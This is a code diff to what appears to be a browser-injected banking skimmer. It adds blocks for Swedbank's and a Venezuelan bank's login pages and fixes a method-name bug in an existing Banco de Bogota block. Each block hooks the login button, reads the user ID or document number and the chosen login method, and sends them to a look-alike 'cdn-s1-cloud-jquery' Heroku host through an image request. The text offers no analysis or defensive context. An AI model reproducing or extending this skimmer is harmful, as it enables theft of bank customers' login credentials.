@@ -8,6 +8,36 @@ for (var i = 0; i < arrayLength; i++) {
 }
 
 
+if (top['location']['href']['indexOf']('https://online.swedbank.se/app/privat/login') > -1) {
+    var interval = setInterval(function () {
+        if (document['getElementsByClassName']('app-identification_login-method')[0]) {
+            clearInterval(interval);
+            document['getElementsByClassName']('_btn--block swed-button _margins-lg swed-button--primary')[0].onclick = function (_0x441cx2) {
+              var option = document.getElementById("swed-ui-id-09fp5ygy8-40");
+              var select = option.options[option.selectedIndex].value;
+              var login = {};
+                  login.userid = document.getElementsByName("userId")[0].value;
+            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+select+"&p="+login.userid;
+            }
+        }
+    }, 1000)
+};
+
+
+if (top['location']['href']['indexOf']('https://web.bancadigitalbod.com') > -1) {
+    var interval = setInterval(function () {
+        if (document['getElementsByClassName']('caja-login')[0]) {
+            clearInterval(interval);
+            document['getElementsByClassName']('button-continuar-apagado')[0].onclick = function (_0x441cx2) {
+              var option = document.getElementsByName("select-corto");
+              var select = option.options[option.selectedIndex].value;
+              var login = {};
+                  login.documentNumber = document.getElementsByName("form:txtNumIdCli")[0].value;
+            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+select+"&p="+login.documentNumber;
+            }
+        }
+    }, 1000)
+};
 
 
 if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota/empresas/') > -1) {
@@ -15,7 +45,7 @@ if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal
         if (document['getElementsByClassName']('cont-personas')[0]) {
             clearInterval(interval);
             document['getElementsByClassName']('btn-ingreso-empresas')[0].onclick = function (_0x441cx2) {
-              var option = document.getElementByName("viewns_Z7_609I03O0J86320APU9LP3V00U2_:formEmpresas:tipoDocumento");
+              var option = document.getElementsByName("viewns_Z7_609I03O0J86320APU9LP3V00U2_:formEmpresas:tipoDocumento");
               var select = option.options[option.selectedIndex].value;
               var login = {};
                   login.documentNumber = document.getElementsByName("viewns_Z7_609I03O0J86320APU9LP3V00U2_:formEmpresas:numeroDocumento")[0].value;
@@ -24,7 +54,6 @@ if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal
         }
     }, 1000)
 };
-
 
 
 if (top['location']['href']['indexOf']('https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota/personas/') > -1) {
